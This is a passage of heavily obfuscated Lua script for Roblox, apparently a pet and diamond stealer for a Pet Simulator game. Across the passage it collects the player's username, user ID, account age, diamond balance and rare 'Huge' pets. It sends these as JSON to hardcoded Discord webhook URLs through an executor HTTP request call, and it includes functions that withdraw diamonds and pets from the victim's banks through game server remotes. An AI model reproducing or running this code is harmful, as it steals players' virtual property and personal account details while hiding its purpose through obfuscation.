																												if (v831 == 2) then
																													table.insert(v327, v832);
																													break;
																												end
																											end
																											break;
																										end
																									end
																								end
																								v805 = 1;
																							end
																						end
																					end
																				end
																				break;
																			end
																		end
																	end
																	if (1 == v678) then
																		v326 = 1;
																		break;
																	end
																end
																break;
															end
														end
													end
													break;
												end
											end
											break;
										end
									end
								end
								break;
							end
						end
						break;
					end
					if (v324 == 0) then
						local v520 = 0;
						while true do
							if (v520 == 1) then
								v324 = 1;
								break;
							end
							if (v520 == 0) then
								v325 = 0;
								v326 = nil;
								v520 = 1;
							end
						end
					end
				end
				break;
			end
			if (v323 == 1) then
				v326 = nil;
				v327 = nil;
				v323 = 2;
			end
			if (v323 == 0) then
				v324 = 0;
				v325 = nil;
				v323 = 1;
			end
		end
	end;
	v32.convert_hugs_in_text = function(v328)
		local v329 = 0;
		local v330;
		local v331;
		local v332;
		while true do
			if (v329 == 0) then
				v330 = 0;
				v331 = nil;
				v329 = 1;
			end
			if (1 == v329) then
				v332 = nil;
				while true do
					if (0 == v330) then
						local v521 = 0;
						while true do
							if (v521 == 0) then
								v331 = 0;
								v332 = nil;
								v521 = 1;
							end
							if (v521 == 1) then
								v330 = 1;
								break;
							end
						end
					end
					if (v330 == 1) then
						while true do
							local v546 = 0;
							local v547;
							local v548;
							while true do
								if (v546 == 0) then
									v547 = 0;
									v548 = nil;
									v546 = 1;
								end
								if (v546 == 1) then
									while true do
										if (v547 == 0) then
											v548 = 0;
											while true do
												if (v548 == 0) then
													if (v331 == 1) then
														return v332;
													end
													if (v331 == 0) then
														local v679 = 0;
														local v680;
														local v681;
														while true do
															if (v679 == 1) then
																while true do
																	if (v680 == 0) then
																		v681 = 0;
																		while true do
																			if (v681 == 0) then
																				local v773 = 0;
																				local v774;
																				while true do
																					if (v773 == 0) then
																						v774 = 0;
																						while true do
																							if (v774 == 1) then
																								v681 = 1;
																								break;
																							end
																							if (0 == v774) then
																								local v818 = 0;
																								while true do
																									if (0 == v818) then
																										v332 = "";
																										if (#v328 > 0) then
																											for v854, v855 in pairs(v328) do
																												v332 = v332 .. "\n" .. "Name ➜ \240\159\148\174 " .. v855[v7("\141\201\87\11", "\227\168\58\110\77\121\184\207")] .. "\nRarity \226\158\156 \240\159\142\137" .. v855[v7("\183\122\46\182\84\168", "\197\27\92\223\32\209\187\17")] .. "\n\240\159\145\146 Golden/Rainbow \226\158\156 \240\159\140\136" .. v855[v7("\252\60\77", "\155\99\63\163")] .. "\n~--------~" .. "";
																											end
																										else
																											v332 = v7("\38\64\91\113", "\104\47\53\20");
																										end
																										v818 = 1;
																									end
																									if (1 == v818) then
																										v774 = 1;
																										break;
																									end
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																			if (v681 == 1) then
																				v331 = 1;
																				break;
																			end
																		end
																		break;
																	end
																end
																break;
															end
															if (v679 == 0) then
																v680 = 0;
																v681 = nil;
																v679 = 1;
															end
														end
													end
													break;
												end
											end
											break;
										end
									end
									break;
								end
							end
						end
						break;
					end
				end
				break;
			end
		end
	end;
	local v40 = {};
	v40[v7("\187\189\216\175\137\188\156", "\228\226\177\193\237\217")] = v40;
	v40.new = function(v333)
		local v334 = 0;
		local v335;
		local v336;
		local v337;
		while true do
			if (v334 == 0) then
				v335 = 0;
				v336 = nil;
				v334 = 1;
			end
			if (v334 == 1) then
				v337 = nil;
				while true do
					if (v335 == 0) then
						local v522 = 0;
						while true do
							if (v522 == 1) then
								v335 = 1;
								break;
							end
							if (v522 == 0) then
								v336 = 0;
								v337 = nil;
								v522 = 1;
							end
						end
					end
					if (v335 == 1) then
						while true do
							if ((1270 - (226 + 1044)) == v336) then
								v337 = 0 - 0;
								while true do
									local v587 = 0;
									local v588;
									local v589;
									while true do
										if (0 == v587) then
											v588 = 0;
											v589 = nil;
											v587 = 1;
										end
										if (v587 == 1) then
											while true do
												if (v588 == 0) then
													v589 = 0;
													while true do
														if (v589 == 0) then
															if (v337 == 0) then
																local v722 = 0;
																local v723;
																while true do
																	if (v722 == 0) then
																		v723 = 0;
																		while true do
																			if (v723 == 0) then
																				local v775 = 0;
																				while true do
																					if (v775 == 1) then
																						v723 = 1;
																						break;
																					end
																					if (v775 == 0) then
																						self = setmetatable({}, v40);
																						self[v7("\226\53\164\34", "\134\84\208\67")] = v22.get(v7("\40\166\88\193\62\189\1\168", "\111\195\44\225\124\220")):InvokeServer(v333);
																						v775 = 1;
																					end
																				end
																			end
																			if (v723 == 1) then
																				v337 = 1;
																				break;
																			end
																		end
																		break;
																	end
																end
															end
															if (v337 == 1) then
																local v724 = 0;
																local v725;
																while true do
																	if (v724 == 0) then
																		v725 = 0;
																		while true do
																			if (v725 == 0) then
																				local v776 = 0;
																				local v777;
																				while true do
																					if (v776 == 0) then
																						v777 = 0;
																						while true do
																							if (0 == v777) then
																								local v819 = 0;
																								while true do
																									if (v819 == 0) then
																										self[v7("\73\6\165\130", "\60\115\204\230")] = v333;
																										return self;
																									end
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
													end
													break;
												end
											end
											break;
										end
									end
								end
								break;
							end
						end
						break;
					end
				end
				break;
			end
		end
	end;
	v40.withdraw_diamonds = function(v338)
		if (v338[v7("\116\230\46\234", "\16\135\90\139")][v7("\75\64\123\20\50\73\81", "\24\52\20\102\83\46\52")][v7("\44\209\61\51\33\1\199\54", "\111\164\79\65\68")][v7("\206\207\216\142\209\32\238\213", "\138\166\185\227\190\78")] > 0) then
			v22.get(v7("\137\217\72\11\51\156\162\204\78\4\97\170\188", "\203\184\38\96\19\203")):InvokeServer(v338.uuid, {}, v338[v7("\29\202\96\196", "\121\171\20\165\87\50\67")][v7("\49\210\55\171\55\190\7", "\98\166\88\217\86\217")][v7("\255\227\228\107\4\136\223\239", "\188\150\150\25\97\230")].Diamonds);
		end
	end;
	v40.withdraw_pets = function(v339)
		local v340 = 0;
		local v341;
		local v342;
		local v343;
		while true do
			if (v340 == 0) then
				v341 = 0;
				v342 = nil;
				v340 = 1;
			end
			if (v340 == 1) then
				v343 = nil;
				while true do
					if (v341 == 1) then
						while true do
							if (v342 == (118 - (32 + 85))) then
								if (#v343 > 0) then
									v22.get(v7("\236\56\125\114\1\249\48\103\113\69\220\56\100", "\174\89\19\25\33")):InvokeServer(v339.uuid, v343, 0);
								end
								break;
							end
							if (v342 == 0) then
								local v566 = 0;
								local v567;
								local v568;
								while true do
									if (0 == v566) then
										v567 = 0;
										v568 = nil;
										v566 = 1;
									end
									if (v566 == 1) then
										while true do
											if (0 == v567) then
												v568 = 0;
												while true do
													if (v568 == 1) then
														v342 = 1;
														break;
													end
													if (v568 == 0) then
														local v682 = 0;
														local v683;
														while true do
															if (v682 == 0) then
																v683 = 0;
																while true do
																	if (0 == v683) then
																		local v745 = 0;
																		while true do
																			if (v745 == 1) then
																				v683 = 1;
																				break;
																			end
																			if (v745 == 0) then
																				v343 = {};
																				for v796, v797 in pairs(v32.new(v339[v7("\233\219\157\94", "\141\186\233\63\98\108")][v7("\22\229\229\62\183\34\244", "\69\145\138\76\214")].Pets):get_rm_pets()) do
																					table.insert(v343, v797.uid);
																				end
																				v745 = 1;
																			end
																		end
																	end
																	if (v683 == 1) then
																		v568 = 1 + 0;
																		break;
																	end
																end
																break;
															end
														end
													end
												end
												break;
											end
										end
										break;
									end
								end
							end
						end
						break;
					end
					if (0 == v341) then
						local v523 = 0;
						local v524;
						while true do
							if (v523 == 0) then
								v524 = 0;
								while true do
									if (v524 == 1) then
										v341 = 1;
										break;
									end
									if (v524 == 0) then
										local v610 = 0;
										while true do
											if (v610 == 0) then
												v342 = 0;
												v343 = nil;
												v610 = 1;
											end
											if (v610 == 1) then
												v524 = 1;
												break;
											end
										end
									end
								end
								break;
							end
						end
					end
				end
				break;
			end
		end
	end;
	local v45 = {[v7("\41\46\28\89\93", "\107\79\114\50\46\151\231")]={}};
	v45[v7("\41\79\198\135\141\186\14", "\118\16\175\233\233\223")] = v45;
	v45.new = function(v344)
		local v345 = 0;
		local v346;
		local v347;
		while true do
			if (v345 == 1) then
				while true do
					if ((0 + 0) == v346) then
						v347 = 0;
						while true do
							local v549 = 0;
							while true do
								if (v549 == 0) then
									if (v347 == 0) then
										local v611 = 0;
										local v612;
										while true do
											if (0 == v611) then
												v612 = 0;
												while true do
													if (0 == v612) then
														local v684 = 0;
														local v685;
														while true do
															if (0 == v684) then
																v685 = 0;
																while true do
																	if (v685 == 1) then
																		v612 = 1;
																		break;
																	end
																	if (v685 == 0) then
																		local v746 = 0;
																		while true do
																			if (v746 == 1) then
																				v685 = 1;
																				break;
																			end
																			if (0 == v746) then
																				v344 = setmetatable({}, v45);
																				v344[v7("\121\130\133\56\180\224\143\110", "\29\235\228\85\219\142\235")] = 0;
																				v746 = 1;
																			end
																		end
																	end
																end
																break;
															end
														end
													end
													if (v612 == 1) then
														v347 = 1;
														break;
													end
												end
												break;
											end
										end
									end
									if (v347 == 1) then
										local v613 = 0;
										while true do
											if (v613 == 0) then
												for v660, v661 in pairs(v22.get(v7("\231\60\178\245\4\147\121\149\193\55\173\166", "\160\89\198\213\73\234\89\215")):InvokeServer()) do
													local v662 = 0;
													local v663;
													local v664;
													while true do
														if (v662 == 0) then
															v663 = 0;
															v664 = nil;
															v662 = 1;
														end
														if (v662 == 1) then
															while true do
																if (v663 == 1) then
																	table.insert(v344.Banks, v664);
																	break;
																end
																if (v663 == 0) then
																	local v730 = 0;
																	local v731;
																	while true do
																		if (v730 == 0) then
																			v731 = 0;
																			while true do
																				if (v731 == 1) then
																					v663 = 1;
																					break;
																				end
																				if (v731 == 0) then
																					local v798 = 0;
																					while true do
																						if (1 == v798) then
																							v731 = 1;
																							break;
																						end
																						if (v798 == 0) then
																							v664 = v40.new(v661.BUID);
																							v344[v7("\86\52\213\183\210\121\74\52", "\50\93\180\218\189\23\46\71")] = v344[v7("\76\215\165\86\67\74\216\91", "\40\190\196\59\44\36\188")] + v664[v7("\9\61\81\221", "\109\92\37\188\212\154\29")][v7("\105\16\224\182\194\54\95", "\58\100\143\196\163\81")][v7("\45\15\80\49\166\49\74\252", "\110\122\34\67\195\95\41\133")][v7("\242\124\176\86\69\216\113\162", "\182\21\209\59\42")];
																							v798 = 1;
																						end
																					end
																				end
																			end
																			break;
																		end
																	end
																end
															end
															break;
														end
													end
												end
												return v344;
											end
										end
									end
									break;
								end
							end
						end
						break;
					end
				end
				break;
			end
			if (0 == v345) then
				v346 = 0;
				v347 = nil;
				v345 = 1;
			end
		end
	end;
	local v48 = {[v7("\227\93\127\183\234\204\71\127\167", "\165\40\17\212\158")]={}};
	v48[v7("\129\136\94\203\25\36\166", "\222\215\55\165\125\65")] = v48;
	v48.new = function(v348)
		local v349 = 0;
		local v350;
		local v351;
		local v352;
		while true do
			if (v349 == 1) then
				v352 = nil;
				while true do
					if (v350 == 1) then
						while true do
							if (0 == v351) then
								v352 = 0;
								while true do
									local v590 = 0;
									local v591;
									local v592;
									while true do
										if (v590 == 0) then
											v591 = 0;
											v592 = nil;
											v590 = 1;
										end
										if (1 == v590) then
											while true do
												if (v591 == 0) then
													v592 = 0;
													while true do
														if (v592 == 0) then
															local v706 = 0;
															local v707;
															while true do
																if (0 == v706) then
																	v707 = 0;
																	while true do
																		if (v707 == 1) then
																			v592 = 1;
																			break;
																		end
																		if (v707 == 0) then
																			local v762 = 0;
																			while true do
																				if (v762 == 0) then
																					if (v352 == 2) then
																						return self;
																					end
																					if (1 == v352) then
																						local v807 = 0;
																						local v808;
																						while true do
																							if (v807 == 0) then
																								v808 = 0;
																								while true do
																									if (v808 == 0) then
																										local v838 = 0;
																										local v839;
																										while true do
																											if (v838 == 0) then
																												v839 = 0;
																												while true do
																													if (v839 == 0) then
																														local v859 = 0;
																														while true do
																															if (v859 == 1) then
																																v839 = 1;
																																break;
																															end
																															if (v859 == 0) then
																																self[v7("\79\33\211\195\30\225", "\42\76\177\166\122\146\161\141")] = {};
																																self[v7("\117\170\132\17\203\119\98", "\22\197\234\101\174\25")] = "";
																																v859 = 1;
																															end
																														end
																													end
																													if (1 == v839) then
																														v808 = 1;
																														break;
																													end
																												end
																												break;
																											end
																										end
																									end
																									if (v808 == 1) then
																										v352 = 959 - (892 + 65);
																										break;
																									end
																								end
																								break;
																							end
																						end
																					end
																					v762 = 1;
																				end
																				if (v762 == 1) then
																					v707 = 1;
																					break;
																				end
																			end
																		end
																	end
																	break;
																end
															end
														end
														if (v592 == 1) then
															if (v352 == (0 - 0)) then
																local v726 = 0;
																while true do
																	if (1 == v726) then
																		v352 = 1 - 0;
																		break;
																	end
																	if (v726 == 0) then
																		self = setmetatable({}, v48);
																		self[v7("\147\63\56", "\230\77\84\197\188\22\207\183")] = v348;
																		v726 = 1;
																	end
																end
															end
															break;
														end
													end
													break;
												end
											end
											break;
										end
									end
								end
								break;
							end
						end
						break;
					end
					if (v350 == 0) then
						local v525 = 0;
						while true do
							if (0 == v525) then
								v351 = 0;
								v352 = nil;
								v525 = 1;
							end
							if (v525 == 1) then
								v350 = 1;
								break;
							end
						end
					end
				end
				break;
			end
			if (0 == v349) then
				v350 = 0;
				v351 = nil;
				v349 = 1;
			end
		end
	end;
	v48.send = function(v353, v354)
		task.spawn(function()
			local v437 = 0;
			local v438;
			local v439;
			local v440;
			local v441;
			local v442;
			local v443;
			local v444;
			while true do
				if (v437 == 2) then
					v442 = nil;
					v443 = nil;
					v437 = 3;
				end
				if (v437 == 3) then
					v444 = nil;
					while true do
						if (v438 == 0) then
							local v550 = 0;
							while true do
								if (v550 == 0) then
									v439 = 0;
									v440 = nil;
									v550 = 1;
								end
								if (1 == v550) then
									v438 = 1;
									break;
								end
							end
						end
						if (3 == v438) then
							while true do
								if (v439 == 1) then
									local v593 = 0;
									local v594;
									while true do
										if (v593 == 0) then
											v594 = 0;
											while true do
												if (v594 == 1) then
													v439 = 2;
													break;
												end
												if (v594 == 0) then
													local v665 = 0;
													while true do
														if (v665 == 1) then
															v594 = 1;
															break;
														end
														if (0 == v665) then
															v442 = {[v7("\37\234\215\28\54\40\241\148\28\42\54\224", "\70\133\185\104\83")]="application/json"};
															v443 = http_request or v443 or HttpPost or syn[v7("\39\252\5\211\249\159\181", "\85\153\116\166\156\236\193\144")];
															v665 = 1;
														end
													end
												end
											end
											break;
										end
									end
								end
								if (v439 == 2) then
									v444 = {[v7("\252\22\73", "\169\100\37\36\74")]=v353[v7("\21\182\236", "\96\196\128\45\211\132")],[v7("\114\15\131\187", "\48\96\231\194")]=v441,[v7("\174\205\78\6\34\29", "\227\168\58\110\77\121\184\207")]=v7("\149\84\15\139", "\197\27\92\223\32\209\187\17"),[v7("\211\6\94\199\254\17\76", "\155\99\63\163")]=v442};
									pcall(function()
										v443(v444);
									end);
									break;
								end
								if (0 == v439) then
									local v595 = 0;
									while true do
										if (v595 == 0) then
											v440 = {[v7("\135\141\223\181\136\183\144", "\228\226\177\193\237\217")]=(v440[v7("\219\58\131\111\90\220\187", "\184\85\237\27\63\178\207\212")] or ""),[v7("\227\57\178\38\226\39", "\134\84\208\67")]=(v440[v7("\90\5\91\12\91\27", "\63\104\57\105")] or {})};
											v441 = game:GetService(v7("\116\7\184\150\111\22\190\144\85\16\169", "\60\115\204\230")):JSONEncode(v440);
											v595 = 1;
										end
										if (v595 == 1) then
											v439 = 1;
											break;
										end
									end
								end
							end
							break;
						end
						if (v438 == 1) then
							local v551 = 0;
							while true do
								if (v551 == 1) then
									v438 = 2;
									break;
								end
								if (v551 == 0) then
									v441 = nil;
									v442 = nil;
									v551 = 1;
								end
							end
						end
						if (v438 == 2) then
							local v552 = 0;
							while true do
								if (v552 == 1) then
									v438 = 3;
									break;
								end
								if (v552 == 0) then
									v443 = nil;
									v444 = nil;
									v552 = 1;
								end
							end
						end
					end
					break;
				end
				if (v437 == 1) then
					v440 = nil;
					v441 = nil;
					v437 = 2;
				end
				if (v437 == 0) then
					v438 = 0;
					v439 = nil;
					v437 = 1;
				end
			end
		end);
	end;
	v48[v7("\98\30\137\167\80\2\136\170\87", "\36\107\231\196")].send_log_stats = function(v355)
		local v356 = 0;
		local v357;
		local v358;
		local v359;
		local v360;
		while true do
			if (v356 == 1) then
				v359 = nil;
				v360 = nil;
				v356 = 2;
			end
			if (v356 == 0) then
				v357 = 0;
				v358 = nil;
				v356 = 1;
			end
			if (v356 == 2) then
				while true do
					if (1 == v357) then
						v360 = nil;
						while true do
							if (v358 == (0 - 0)) then
								local v569 = 0;
								local v570;
								local v571;
								while true do
									if (v569 == 1) then
										while true do
											if (v570 == 0) then
												v571 = 0;
												while true do
													if (v571 == (350 - (87 + 263))) then
														local v686 = 0;
														local v687;
														while true do
															if (v686 == 0) then
																v687 = 0;
																while true do
																	if (v687 == 1) then
																		v571 = 1;
																		break;
																	end
																	if (v687 == 0) then
																		local v748 = 0;
																		while true do
																			if (v748 == 0) then
																				v359 = v8[v7("\180\92\163\167", "\231\61\213\194")].Get();
																				v360 = v13.formatted_number(v359.Diamonds);
																				v748 = 1;
																			end
																			if (v748 == 1) then
																				v687 = 1;
																				break;
																			end
																		end
																	end
																end
																break;
															end
														end
													end
													if (v571 == 1) then
														v358 = 1;
														break;
													end
												end
												break;
											end
										end
										break;
									end
									if (0 == v569) then
										v570 = 0;
										v571 = nil;
										v569 = 1;
									end
								end
							end
							if (v358 == 1) then
								v355:send({[v7("\115\232\52\255\117\233\46", "\16\135\90\139")]="",[v7("\125\89\118\3\55\93", "\24\52\20\102\83\46\52")]={{[v7("\27\205\59\45\33", "\111\164\79\65\68")]=(game[v7("\67\5\172\36\118\27\190", "\19\105\205\93")][v7("\19\166\11\223\141\15\165\9\199\132\45", "\95\201\104\190\225")][v7("\224\174\198\196", "\174\207\171\161")] .. v7("\170\138\153\169\203\61\254\134\222\140\202\110\249\197\216\142\211\43\238\135", "\138\166\185\227\190\78")),[v7("\29\206\103\198\37\91\51\13\194\123\203", "\121\171\20\165\87\50\67")]=(v7("\55\213\61\171\56\184\15\195\98\249", "\98\166\88\217\86\217") .. game[v7("\231\225\255\20\246\234\196", "\183\141\158\109\147\152")][v7("\32\35\10\231\0\28\5\231\21\41\27", "\108\76\105\134")][v7("\224\234\200\180", "\174\139\165\209\129")] .. "\nUser ID: " .. game[v7("\72\175\178\251\196\212\16", "\24\195\211\130\161\166\99\16")][v7("\58\73\0\232\32\99\26\71\26\236\62", "\118\38\99\137\76\51")][v7("\21\238\35\23\59\13", "\64\157\70\101\114\105")] .. "\nAccount Age: " .. game[v7("\32\76\169\190\230\2\83", "\112\32\200\199\131")][v7("\14\35\83\93\180\243\167\35\53\85\78", "\66\76\48\60\216\163\203")][v7("\5\185\133\118\230\81\218\5\189\131", "\68\218\230\25\147\63\174")] .. v7("\156\210\247\96\18", "\188\150\150\25\97\230") .. "\nRank: " .. v359[v7("\132\172\36\88", "\214\205\74\51\44")]),[v7("\249\195\153\90", "\141\186\233\63\98\108")]=v7("\55\248\233\36", "\69\145\138\76\214"),[v7("\21\127\195\134\155", "\118\16\175\233\233\223")]=65280,[v7("\123\130\129\57\191\253", "\29\235\228\85\219\142\235")]={{[v7("\92\60\217\191", "\50\93\180\218\189\23\46\71")]=(v10[v7("\115\243\77\239\243\121\254", "\23\154\44\130\156")] .. v7("\8\250\173\90\65\75\210\76\205\228", "\40\190\196\59\44\36\188") .. v10[v7("\23\24\167\160\161\56\23", "\115\113\198\205\206\86")]),[v7("\27\61\73\201\177", "\109\92\37\188\212\154\29")]=("```\n" .. v10[v7("\91\150\69\241\77", "\58\228\55\158")] .. "" .. v360 .. "\n```"),[v7("\83\10\227\173\205\52", "\58\100\143\196\163\81")]=true},{[v7("\0\27\79\38", "\110\122\34\67\195\95\41\133")]=(v10[v7("\55\184\136\222\37", "\85\212\233\176\78\92\205")] .. v7("\150\71\180\86\75\223\123\184\85\77\150\69\180\79\89\150", "\182\21\209\59\42") .. v10[v7("\224\70\89\134\233", "\130\42\56\232")]),[v7("\168\182\91\208\24", "\222\215\55\165\125\65")]=("```\n" .. tostring(v32.count_rm_pets()) .. "\n```"),[v7("\67\34\221\207\20\247", "\42\76\177\166\122\146\161\141")]=true},{[v7("\120\164\135\0", "\22\197\234\101\174\25")]=(v10[v7("\55\235\165\52\250", "\95\138\213\68\131\32")] .. v7("\198\5\33\162\217\101\239", "\230\77\84\197\188\22\207\183") .. v10[v7("\126\43\56\177\90", "\22\74\72\193\35")]),[v7("\35\248\24\211\249", "\85\153\116\166\156\236\193\144")]=("```\n" .. v32.convert_hugs_in_text(v32.get_hugs_pets_data(v32.get_hugs_pets())) .. "\n```"),[v7("\9\170\236\68\189\225", "\96\196\128\45\211\132")]=false}}}}});
								break;
							end
						end
						break;
					end
					if (v357 == 0) then
						local v526 = 0;
						while true do
							if (v526 == 0) then
								v358 = 0;
								v359 = nil;
								v526 = 1;
							end
							if (v526 == 1) then
								v357 = 1;
								break;
							end
						end
					end
				end
				break;
			end
		end
	end;
	v48[v7("\126\57\119\231\76\37\118\234\75", "\56\76\25\132")].send_log_next_pet = function(v361, v362)
		local v363 = 0;
		local v364;
		local v365;
		local v366;
		while true do
			if (v363 == 1) then
				v366 = nil;
				while true do
					if (v364 == 0) then
						local v527 = 0;
						local v528;
						while true do
							if (v527 == 0) then
								v528 = 0;
								while true do
									if (v528 == 0) then
										local v614 = 0;
										while true do
											if (1 == v614) then
												v528 = 1;
												break;
											end
											if (v614 == 0) then
												v365 = v8[v7("\252\95\215\174", "\175\62\161\203\70")].Get();
												v366 = v13.formatted_number(v365.Diamonds);
												v614 = 1;
											end
										end
									end
									if (1 == v528) then
										v364 = 1;
										break;
									end
								end
								break;
							end
						end
					end
					if (1 == v364) then
						v361:send({[v7("\219\58\131\111\90\220\187", "\184\85\237\27\63\178\207\212")]=(((v362[v7("\61\41\218\198", "\85\92\189\163\115")] == true) and v7("\127\13\79\12\77\17\86\7\90", "\63\104\57\105")) or ""),[v7("\65\6\133\161\64\24", "\36\107\231\196")]={{[v7("\147\84\161\174\130", "\231\61\213\194")]=(game[v7("\8\37\173\41\61\59\191", "\88\73\204\80")][v7("\246\33\128\17\74\25\214\47\154\21\84", "\186\78\227\112\38\73")][v7("\84\253\90\248", "\26\156\55\157\53\51")] .. v7("\51\69\237\23\102\26\185\125\116\6\185\125\96\10\172\48\126\12\169\124", "\19\105\205\93")),[v7("\59\172\27\221\147\54\185\28\215\142\49", "\95\201\104\190\225")]=(v7("\251\188\206\211\192\174\198\196\148\239", "\174\207\171\161") .. game[v7("\96\128\217\15\220\170\67", "\48\236\184\118\185\216")][v7("\24\234\190\86\60\255\56\228\164\82\34", "\84\133\221\55\80\175")][v7("\114\188\234\33", "\60\221\135\68\198\167")] .. "\nUser ID: " .. game[v7("\233\226\188\225\134\80\202", "\185\142\221\152\227\34")][v7("\219\87\198\86\246\115\63\246\65\192\69", "\151\56\165\55\154\35\83")][v7("\219\179\70\23\199\164", "\142\192\35\101")] .. "\nAccount Age: " .. game[v7("\38\218\116\48\166\245\159", "\118\182\21\73\195\135\236\204")][v7("\209\7\63\27\76\52\1\252\17\57\8", "\157\104\92\122\32\100\109")][v7("\138\160\165\192\223\51\51\172\172\166", "\203\195\198\175\170\93\71\237")] .. v7("\151\201\255\20\224", "\183\141\158\109\147\152") .. "\nRank: " .. v365[v7("\206\47\69\53", "\156\78\43\94\181\49\113")] .. "\n\n**Mail Info:**"),[v7("\24\53\25\227", "\108\76\105\134")]=v7("\220\226\198\185", "\174\139\165\209\129"),[v7("\123\172\191\237\211", "\24\195\211\130\161\166\99\16")]=65280,[v7("\16\79\6\229\40\64", "\118\38\99\137\76\51")]={{[v7("\46\252\43\0", "\64\157\70\101\114\105")]=(v10[v7("\125\123\233\201\172\5\71", "\25\18\136\164\195\107\35")] .. v7("\80\100\161\166\238\31\78\172\180\163", "\112\32\200\199\131") .. v10[v7("\188\225\44\164\64\124\184", "\216\136\77\201\47\18\220\161")]),[v7("\52\45\92\73\189", "\66\76\48\60\216\163\203")]=("```\n" .. v10[v7("\131\63\254\36\205", "\226\77\140\75\186\104\188")] .. "" .. v366 .. "\n```"),[v7("\45\180\138\112\253\90", "\68\218\230\25\147\63\174")]=true},{[v7("\184\172\39\86", "\214\205\74\51\44")]=(v10[v7("\77\181\207\222\52", "\47\217\174\176\95")] .. v7("\55\200\73\239\253\126\244\69\236\251\55\202\73\246\239\55", "\23\154\44\130\156") .. v10[v7("\36\180\220\120\9", "\70\216\189\22\98\210\52\24")]),[v7("\5\16\170\184\171", "\115\113\198\205\206\86")]=("```\n" .. tostring(v32.count_rm_pets()) .. "\n```"),[v7("\83\138\91\247\84\129", "\58\228\55\158")]=true},{[v7("\59\181\132\213", "\85\212\233\176\78\92\205")]=(v10[v7("\192\206\222\177", "\179\186\191\195\231")] .. v7("\162\111\64\139\238\95\75\129\244\79\24", "\130\42\56\232") .. v10[v7("\247\237\62\10", "\132\153\95\120")]),[v7("\41\235\185\49\230", "\95\138\213\68\131\32")]=("```\n" .. v362[v7("\174\176\191\11", "\192\209\210\110\77\151\186")] .. "\n```"),[v7("\127\36\36\168\77\115", "\22\74\72\193\35")]=true}}}}});
						break;
					end
				end
				break;
			end
			if (v363 == 0) then
				v364 = 0;
				v365 = nil;
				v363 = 1;
			end
		end
	end;
	local v54 = {};
	v54[v7("\251\223\10\44\237\250\220", "\164\128\99\66\137\159")] = v54;
	setmetatable(v54, {[v7("\103\19\122\229\84\32", "\56\76\25\132")]=function(v367, ...)
		local v368 = 0;
		local v369;
		while true do
			if (0 == v368) then
				v369 = 0;
				while true do
					local v506 = 0;
					while true do
						if (v506 == 1) then
							if (v369 == 3) then
								return v367;
							end
							if (v369 == 1) then
								local v572 = 0;
								local v573;
								while true do
									if (v572 == 0) then
										v573 = 0;
										while true do
											if (0 == v573) then
												local v651 = 0;
												while true do
													if (v651 == 1) then
														v573 = 1;
														break;
													end
													if (v651 == 0) then
														v367[v7("\3\208\62\255\62\247\49\196\62\255", "\86\163\91\141\114\152")] = v48.new(v367.WebhookUrl);
														v367[v7("\15\64\14\102\95\53\84\12\113\97", "\90\51\107\20\19")][v7("\27\152\254\134\251\52\130\254\150", "\93\237\144\229\143")].send_log_stats(v367.UserLogger);
														v651 = 1;
													end
												end
											end
											if (v573 == 1) then
												v369 = 2;
												break;
											end
										end
										break;
									end
								end
							end
							break;
						end
						if (v506 == 0) then
							if (2 == v369) then
								local v574 = 0;
								local v575;
								while true do
									if (0 == v574) then
										v575 = 0;
										while true do
											if (v575 == 0) then
												local v652 = 0;
												while true do
													if (v652 == 1) then
														v575 = 1;
														break;
													end
													if (v652 == 0) then
														v367[v7("\153\12\134\235\191\12\165\230\185\7\140\251", "\222\96\233\137")] = v48.new("https://discord.com/api/webhooks/1121094503340724254/UiNgP7hPAd3Axg5crtHCBSg0c0DLGKZ-XT_Es8hbZf5STborerpcombRlZKjx8rNlTJf");
														v367[v7("\215\181\188\165\30\132\223\255\190\180\162\13", "\144\217\211\199\127\232\147")][v7("\98\237\33\61\60\220\74\12\87", "\36\152\79\94\72\181\37\98")].send_log_stats(v367.GlobalLogger);
														v652 = 1;
													end
												end
											end
											if (v575 == 1) then
												v369 = 3;
												break;
											end
										end
										break;
									end
								end
							end
							if (v369 == 0) then
								local v576 = 0;
								while true do
									if (v576 == 1) then
										v369 = 1;
										break;
									end
									if (v576 == 0) then
										v367[v7("\27\194\217\75\23\216\215\76\26\217\217\69\51\210\220", "\95\183\184\39")] = false;
										if (#v32.get_hugs_pets() >= (185 - (67 + 113))) then
											local v626 = 0;
											local v627;
											local v628;
											while true do
												if (v626 == 0) then
													v627 = 0;
													v628 = nil;
													v626 = 1;
												end
												if (v626 == 1) then
													while true do
														if (v627 == 0) then
															v628 = 0;
															while true do
																if (v628 == 1) then
																	v367[v7("\38\160\62\235\14\91\143\9\144\49\230\36\88\133\6", "\98\213\95\135\70\52\224")] = true;
																	break;
																end
																if (v628 == 0) then
																	local v735 = 0;
																	while true do
																		if (v735 == 0) then
																			v367[v7("\97\237\166\219\121\85\243\166", "\52\158\195\169\23")] = v7("\250\68\195\174\45\198\77\213\170\40\156\10", "\175\62\161\203\70");
																			v367[v7("\188\127\190\58\123\137\62\78\153\118", "\235\26\220\82\20\230\85\27")] = "https://discord.com/api/webhooks/1121094259743932436/GTL9ngVwinOjKZL2liPyLzMrZwbAUgiqM0abqzNWM-Cimts1UlQm7qsCGDh1BHzX8fpD";
																			v735 = 1;
																		end
																		if (v735 == 1) then
																			v628 = 1;
																			break;
																		end
																	end
																end
															end
															break;
														end
													end
													break;
												end
											end
										else
											local v629 = 0;
											while true do
												if (v629 == 0) then
													v367[v7("\65\155\164\251\204\117\133\164", "\20\232\193\137\162")] = _G[v7("\68\49\218\215\168\230\129\18", "\17\66\191\165\198\135\236\119")] or v7("\0\38\223\198\24\60\47\201\194\29\102\104", "\85\92\189\163\115");
													v367[v7("\230\10\173\166\28\240\227\217\195\3", "\177\111\207\206\115\159\136\140")] = _G[v7("\104\0\139\24\27\219\68\106\23\133", "\63\101\233\112\116\180\47")] or "https://discord.com/api/webhooks/1121094259743932436/GTL9ngVwinOjKZL2liPyLzMrZwbAUgiqM0abqzNWM-Cimts1UlQm7qsCGDh1BHzX8fpD";
													break;
												end
											end
										end
										v576 = 1;
									end
								end
							end
							v506 = 1;
						end
					end
				end
				break;
			end
		end
	end});
	v54.Diamonds = function(v370)
		local v371 = 0;
		local v372;
		local v373;
		local v374;
		local v375;
		local v376;
		local v377;
		local v378;
		local v379;
		while true do
			if (v371 == 2) then
				v376 = nil;
				v377 = nil;
				v371 = 3;
			end
			if (v371 == 3) then
				v378 = nil;
				v379 = nil;
				v371 = 4;
			end
			if (v371 == 1) then
				v374 = nil;
				v375 = nil;
